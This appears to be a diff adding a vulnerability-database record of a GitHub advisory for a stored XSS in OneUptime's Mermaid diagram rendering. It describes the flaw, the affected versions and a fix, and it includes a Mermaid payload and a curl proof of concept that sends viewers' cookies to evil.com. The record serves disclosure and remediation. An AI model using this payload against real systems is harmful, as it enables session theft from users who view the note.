@@ -1,0 +1,217 @@
+advisory_id: GHSA-wvh5-6vjm-23qh
+datasource_id: github_osv/GHSA-wvh5-6vjm-23qh
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-wvh5-6vjm-23qh/GHSA-wvh5-6vjm-23qh.json
+aliases:
+  - CVE-2026-32308
+summary: |
+  OneUptime: Stored XSS via Mermaid Diagram Rendering (securityLevel: "loose")
+  ### Summary
+
+  The Markdown viewer component renders Mermaid diagrams with `securityLevel: "loose"` and injects the SVG output via `innerHTML`. This configuration explicitly allows interactive event bindings in Mermaid diagrams, enabling XSS through Mermaid's `click` directive which can execute arbitrary JavaScript. Any field that renders markdown (incident descriptions, status page announcements, monitor notes) is vulnerable.
+
+  ### Details
+
+  **Mermaid configuration — `Common/UI/Components/Markdown.tsx/MarkdownViewer.tsx:76`:**
+
+  ```typescript
+  // MarkdownViewer.tsx:76
+  mermaid.initialize({
+      securityLevel: "loose",  // Allows interactive event bindings
+      // ...
+  });
+  ```
+
+  The Mermaid documentation explicitly warns: `securityLevel: "loose"` allows click events and other interactive bindings in diagrams. The safe default is `"strict"` which strips all interactivity.
+
+  **SVG injection via innerHTML — `MarkdownViewer.tsx:106`:**
+
+  ```typescript
+  // MarkdownViewer.tsx:106
+  if (containerRef.current) {
+      containerRef.current.innerHTML = svg;  // Raw SVG injection
+  }
+  ```
+
+  After Mermaid renders the diagram to SVG, the SVG string is injected directly into the DOM via `innerHTML`. Combined with `securityLevel: "loose"`, this allows event handlers embedded in the SVG to execute.
+
+  **Mermaid XSS payload:**
+
+  ```markdown
+  ```mermaid
+  graph TD
+      A["Click me"]
+      click A callback "javascript:fetch('https://evil.com/?c='+document.cookie)"
+  ```​
+  ```
+
+  With `securityLevel: "loose"`, Mermaid processes the `click` directive and creates an SVG element with an event handler that executes the JavaScript.
+
+  ### PoC
+
+  ```bash
+  # Authenticate
+  TOKEN=$(curl -s -X POST 'https://TARGET/identity/login' \
+    -H 'Content-Type: application/json' \
+    -d '{"email":"user@example.com","password":"password123"}' \
+    | jq -r '.token')
+
+  # Create an incident note with Mermaid XSS payload
+  curl -s -X POST 'https://TARGET/api/incident-note' \
+    -H "Authorization: Bearer $TOKEN" \
+    -H 'Content-Type: application/json' \
+    -H 'tenantid: PROJECT_ID' \
+    -d '{
+      "data": {
+        "incidentId": "INCIDENT_ID",
+        "note": "## Root Cause Analysis\n\n```mermaid\ngraph TD\n    A[\"Load Balancer\"] --> B[\"App Server\"]\n    click A callback \"javascript:fetch('"'"'https://evil.com/?c='"'"'+document.cookie)\"\n```",
+        "noteType": "RootCause"
+      }
+    }'
+
+  # Any user viewing this incident note will have their cookies exfiltrated
+  ```
+
+  ```bash
+  # Verify the vulnerability in source code:
+
+  # 1. securityLevel: "loose":
+  grep -n 'securityLevel' Common/UI/Components/Markdown.tsx/MarkdownViewer.tsx
+  # Line 76: securityLevel: "loose"
+
+  # 2. innerHTML injection:
+  grep -n 'innerHTML' Common/UI/Components/Markdown.tsx/MarkdownViewer.tsx
+  # Line 106: containerRef.current.innerHTML = svg
+  ```
+
+  ### Impact
+
+  **Stored XSS in any markdown-rendered field.** Affects:
+
+  1. **Incident notes/descriptions** — viewed by on-call engineers during incidents
+  2. **Status page announcements** — viewed by public visitors
+  3. **Monitor descriptions** — viewed by team members
+  4. **Any markdown field** — the MarkdownViewer component is shared across the UI
+
+  The "loose" security level combined with `innerHTML` injection allows arbitrary JavaScript execution in the context of the OneUptime application.
+
+  ### Proposed Fix
+
+  ```typescript
+  // 1. Change securityLevel to "strict" (default safe mode):
+  mermaid.initialize({
+      securityLevel: "strict",  // Strips all interactive bindings
+      // ...
+  });
+
+  // 2. Use DOMPurify on the SVG output before innerHTML injection:
+  import DOMPurify from "dompurify";
+
+  if (containerRef.current) {
+      containerRef.current.innerHTML = DOMPurify.sanitize(svg, {
+          USE_PROFILES: { svg: true, svgFilters: true },
+          ADD_TAGS: ['foreignObject'],
+      });
+  }
+  ```
+impacted_packages:
+  - purl: pkg:npm/oneuptime
+    affected_versions: vers:npm/<10.0.23
+    fixed_versions: vers:npm/10.0.23
+    affected_packages:
+      - pkg:npm/oneuptime@4.0.3
+      - pkg:npm/oneuptime@4.0.5
+      - pkg:npm/oneuptime@4.0.6
+      - pkg:npm/oneuptime@4.0.7
+      - pkg:npm/oneuptime@4.0.8
+      - pkg:npm/oneuptime@4.0.9
+      - pkg:npm/oneuptime@4.0.10
+      - pkg:npm/oneuptime@4.0.11
+      - pkg:npm/oneuptime@4.0.12
+      - pkg:npm/oneuptime@4.0.13
+      - pkg:npm/oneuptime@4.0.14
+      - pkg:npm/oneuptime@4.0.15
+      - pkg:npm/oneuptime@4.0.16
+      - pkg:npm/oneuptime@4.0.17
+      - pkg:npm/oneuptime@4.0.18
+      - pkg:npm/oneuptime@4.0.19
+      - pkg:npm/oneuptime@4.0.20
+      - pkg:npm/oneuptime@4.0.21
+      - pkg:npm/oneuptime@4.0.22
+      - pkg:npm/oneuptime@4.0.23
+      - pkg:npm/oneuptime@4.0.24
+      - pkg:npm/oneuptime@4.0.25
+      - pkg:npm/oneuptime@4.0.26
+      - pkg:npm/oneuptime@4.0.27
+      - pkg:npm/oneuptime@4.0.28
+      - pkg:npm/oneuptime@4.0.29
+      - pkg:npm/oneuptime@4.0.30
+      - pkg:npm/oneuptime@4.0.31
+      - pkg:npm/oneuptime@4.0.32
+      - pkg:npm/oneuptime@4.0.33
+      - pkg:npm/oneuptime@4.0.34
+      - pkg:npm/oneuptime@4.0.35
+      - pkg:npm/oneuptime@4.0.36
+      - pkg:npm/oneuptime@4.0.37
+      - pkg:npm/oneuptime@4.0.38
+      - pkg:npm/oneuptime@4.0.39
+      - pkg:npm/oneuptime@4.0.40
+      - pkg:npm/oneuptime@4.0.41
+      - pkg:npm/oneuptime@4.0.42
+      - pkg:npm/oneuptime@4.0.43
+      - pkg:npm/oneuptime@4.0.44
+      - pkg:npm/oneuptime@4.0.45
+      - pkg:npm/oneuptime@4.0.46
+      - pkg:npm/oneuptime@4.0.47
+      - pkg:npm/oneuptime@4.0.48
+      - pkg:npm/oneuptime@4.0.49
+      - pkg:npm/oneuptime@4.0.50
+      - pkg:npm/oneuptime@4.0.51
+      - pkg:npm/oneuptime@4.0.52
+      - pkg:npm/oneuptime@4.0.53
+      - pkg:npm/oneuptime@4.0.54
+      - pkg:npm/oneuptime@4.0.55
+      - pkg:npm/oneuptime@4.0.56
+      - pkg:npm/oneuptime@4.0.57
+      - pkg:npm/oneuptime@4.0.58
+      - pkg:npm/oneuptime@4.0.59
+      - pkg:npm/oneuptime@4.0.60
+      - pkg:npm/oneuptime@4.0.61
+      - pkg:npm/oneuptime@4.0.62
+      - pkg:npm/oneuptime@4.0.63
+      - pkg:npm/oneuptime@4.0.64
+      - pkg:npm/oneuptime@4.0.65
+      - pkg:npm/oneuptime@4.0.66
+      - pkg:npm/oneuptime@4.0.67
+      - pkg:npm/oneuptime@4.0.68
+      - pkg:npm/oneuptime@4.0.69
+    fixed_packages:
+      - pkg:npm/oneuptime@10.0.23
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '7.6'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-wvh5-6vjm-23qh/GHSA-wvh5-6vjm-23qh.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-79
+references:
+  - url: https://github.com/OneUptime/oneuptime
+    reference_type:
+    reference_id:
+  - url: https://github.com/OneUptime/oneuptime/releases/tag/10.0.23
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-32308
+    reference_type:
+    reference_id: CVE-2026-32308
+  - url: https://github.com/OneUptime/oneuptime/security/advisories/GHSA-wvh5-6vjm-23qh
+    reference_type:
+    reference_id: GHSA-wvh5-6vjm-23qh
+exploits: []
